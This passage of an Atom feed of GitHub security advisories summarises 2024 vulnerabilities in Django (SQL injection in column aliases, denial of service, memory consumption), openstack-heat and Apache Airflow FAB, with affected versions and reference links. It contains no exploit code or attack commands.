        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. QuerySet.values() and values_list() methods on models with a JSONField are subject to SQL injection in column aliases via a crafted JSON object key as a passed *arg.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42005">https://nvd.nist.gov/vuln/detail/CVE-2024-42005</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d">https://github.com/django/django/commit/32ebcbf2e1fe3e5ba79a6554a167efce81f7422d</a></li>
<li><a href="https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28">https://github.com/django/django/commit/f4af67b9b41e0f4c117a8741da3abbd1c869ab28</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-70.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-pv4p-cwwg-4rph">https://github.com/advisories/GHSA-pv4p-cwwg-4rph</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-pv4p-cwwg-4rph</uri>
        </author>
        <category label="severity" term="CRITICAL"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to a denial-of-service attack]]></title>
        <id>https://github.com/advisories/GHSA-795c-9xpc-xw6g</id>
        <link href="https://github.com/advisories/GHSA-795c-9xpc-xw6g"/>
        <updated>2024-08-07T19:02:14.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41990">https://nvd.nist.gov/vuln/detail/CVE-2024-41990</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/7b7b909579c8311c140c89b8a9431bf537febf93">https://github.com/django/django/commit/7b7b909579c8311c140c89b8a9431bf537febf93</a></li>
<li><a href="https://github.com/django/django/commit/d0a82e26a74940bf0c78204933c3bdd6a283eb88">https://github.com/django/django/commit/d0a82e26a74940bf0c78204933c3bdd6a283eb88</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-68.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-68.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-795c-9xpc-xw6g">https://github.com/advisories/GHSA-795c-9xpc-xw6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-795c-9xpc-xw6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django vulnerable to a denial-of-service attack]]></title>
        <id>https://github.com/advisories/GHSA-795c-9xpc-xw6g</id>
        <link href="https://github.com/advisories/GHSA-795c-9xpc-xw6g"/>
        <updated>2024-08-07T19:02:14.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The urlize() and urlizetrunc() template filters are subject to a potential denial-of-service attack via very large inputs with a specific sequence of characters.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41990">https://nvd.nist.gov/vuln/detail/CVE-2024-41990</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/7b7b909579c8311c140c89b8a9431bf537febf93">https://github.com/django/django/commit/7b7b909579c8311c140c89b8a9431bf537febf93</a></li>
<li><a href="https://github.com/django/django/commit/d0a82e26a74940bf0c78204933c3bdd6a283eb88">https://github.com/django/django/commit/d0a82e26a74940bf0c78204933c3bdd6a283eb88</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-68.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-68.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-795c-9xpc-xw6g">https://github.com/advisories/GHSA-795c-9xpc-xw6g</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-795c-9xpc-xw6g</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django memory consumption vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jh75-99hh-qvx9</id>
        <link href="https://github.com/advisories/GHSA-jh75-99hh-qvx9"/>
        <updated>2024-08-07T19:01:46.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The floatformat template filter is subject to significant memory consumption when given a string representation of a number in scientific notation with a large exponent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41989">https://nvd.nist.gov/vuln/detail/CVE-2024-41989</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/27900fe56f3d3cabb4aeb6ccb82f92bab29073a8">https://github.com/django/django/commit/27900fe56f3d3cabb4aeb6ccb82f92bab29073a8</a></li>
<li><a href="https://github.com/django/django/commit/fc76660f589ac07e45e9cd34ccb8087aeb11904b">https://github.com/django/django/commit/fc76660f589ac07e45e9cd34ccb8087aeb11904b</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-67.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-67.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-jh75-99hh-qvx9">https://github.com/advisories/GHSA-jh75-99hh-qvx9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh75-99hh-qvx9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[Django] Django memory consumption vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-jh75-99hh-qvx9</id>
        <link href="https://github.com/advisories/GHSA-jh75-99hh-qvx9"/>
        <updated>2024-08-07T19:01:46.000Z</updated>
        <content type="html"><![CDATA[<p>An issue was discovered in Django 5.0 before 5.0.8 and 4.2 before 4.2.15. The floatformat template filter is subject to significant memory consumption when given a string representation of a number in scientific notation with a large exponent.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-41989">https://nvd.nist.gov/vuln/detail/CVE-2024-41989</a></li>
<li><a href="https://docs.djangoproject.com/en/dev/releases/security">https://docs.djangoproject.com/en/dev/releases/security</a></li>
<li><a href="https://www.djangoproject.com/weblog/2024/aug/06/security-releases">https://www.djangoproject.com/weblog/2024/aug/06/security-releases</a></li>
<li><a href="https://github.com/django/django/commit/27900fe56f3d3cabb4aeb6ccb82f92bab29073a8">https://github.com/django/django/commit/27900fe56f3d3cabb4aeb6ccb82f92bab29073a8</a></li>
<li><a href="https://github.com/django/django/commit/fc76660f589ac07e45e9cd34ccb8087aeb11904b">https://github.com/django/django/commit/fc76660f589ac07e45e9cd34ccb8087aeb11904b</a></li>
<li><a href="https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-67.yaml">https://github.com/pypa/advisory-database/tree/main/vulns/django/PYSEC-2024-67.yaml</a></li>
<li><a href="https://github.com/advisories/GHSA-jh75-99hh-qvx9">https://github.com/advisories/GHSA-jh75-99hh-qvx9</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-jh75-99hh-qvx9</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-07T15:30:42.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[openstack-heat] openstack-heat may disclose sensitive information]]></title>
        <id>https://github.com/advisories/GHSA-2fqr-cx7q-3ph8</id>
        <link href="https://github.com/advisories/GHSA-2fqr-cx7q-3ph8"/>
        <updated>2024-08-05T17:27:42.000Z</updated>
        <content type="html"><![CDATA[<p>An incomplete fix for CVE-2023-1625 was found in openstack-heat. Sensitive information may possibly be disclosed through the OpenStack stack abandon command with the hidden feature set to True and the CVE-2023-1625 fix applied.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-7319">https://nvd.nist.gov/vuln/detail/CVE-2024-7319</a></li>
<li><a href="https://access.redhat.com/security/cve/CVE-2024-7319">https://access.redhat.com/security/cve/CVE-2024-7319</a></li>
<li><a href="https://bugzilla.redhat.com/show_bug.cgi?id=2258810">https://bugzilla.redhat.com/show_bug.cgi?id=2258810</a></li>
<li><a href="https://storyboard.openstack.org/#!/story/2011007">https://storyboard.openstack.org/#!/story/2011007</a></li>
<li><a href="https://github.com/advisories/GHSA-2fqr-cx7q-3ph8">https://github.com/advisories/GHSA-2fqr-cx7q-3ph8</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-2fqr-cx7q-3ph8</uri>
        </author>
        <category label="severity" term="HIGH"/>
        <published>2024-08-02T21:31:34.000Z</published>
    </entry>
    <entry>
        <title type="html"><![CDATA[[apache-airflow-providers-fab] Apache Airflow Providers FAB Insufficient Session Expiration vulnerability]]></title>
        <id>https://github.com/advisories/GHSA-62qf-qm3g-fvcw</id>
        <link href="https://github.com/advisories/GHSA-62qf-qm3g-fvcw"/>
        <updated>2024-08-05T16:09:34.000Z</updated>
        <content type="html"><![CDATA[<p>Insufficient Session Expiration vulnerability in Apache Airflow Providers FAB.</p>
<p>This issue affects Apache Airflow Providers FAB: 1.2.1 (when used with Apache Airflow 2.9.3) and FAB 1.2.0 for all Airflow versions. The FAB provider prevented the user from logging out.&nbsp;&nbsp;</p>
<ul>
<li><p>FAB provider 1.2.1 only affected Airflow 2.9.3 (earlier and later versions of Airflow are not affected)</p>
</li>
<li><p>FAB provider 1.2.0 affected all versions of Airflow.</p>
</li>
</ul>
<p>Users who run Apache Airflow 2.9.3 are recommended to upgrade to Apache Airflow Providers FAB version 1.2.2 which fixes the issue.</p>
<p>Users who run Any Apache Airflow version and have FAB provider 1.2.0 are recommended to upgrade to Apache Airflow Providers FAB version 1.2.2 which fixes the issue.</p>
<p>Also upgrading Apache Airflow to latest version available is recommended.</p>
<p>Note: Early version of Airflow reference container images of Airflow 2.9.3 and constraint files contained FAB provider 1.2.1 version, but this is fixed in updated versions of the images.&nbsp;</p>
<p>Users are advised to pull the latest Airflow images or reinstall FAB provider according to the current constraints.</p>
<h3 id="references">References</h3>
<ul>
<li><a href="https://nvd.nist.gov/vuln/detail/CVE-2024-42447">https://nvd.nist.gov/vuln/detail/CVE-2024-42447</a></li>
<li><a href="https://github.com/apache/airflow/pull/40784">https://github.com/apache/airflow/pull/40784</a></li>
<li><a href="https://lists.apache.org/thread/2zoo8cjlwfjhbfdxfgltcm0hnc0qmc52">https://lists.apache.org/thread/2zoo8cjlwfjhbfdxfgltcm0hnc0qmc52</a></li>
<li><a href="https://github.com/advisories/GHSA-62qf-qm3g-fvcw">https://github.com/advisories/GHSA-62qf-qm3g-fvcw</a></li>
</ul>
]]></content>
        <author>
            <name>GitHub</name>
            <email>GitHub@noreply.github.com</email>
            <uri>https://github.com/advisories/GHSA-62qf-qm3g-fvcw</uri>
        </author>
        <category label="severity" term="MODERATE"/>
        <published>2024-08-05T09:30:26.000Z</published>
    </entry>
</feed>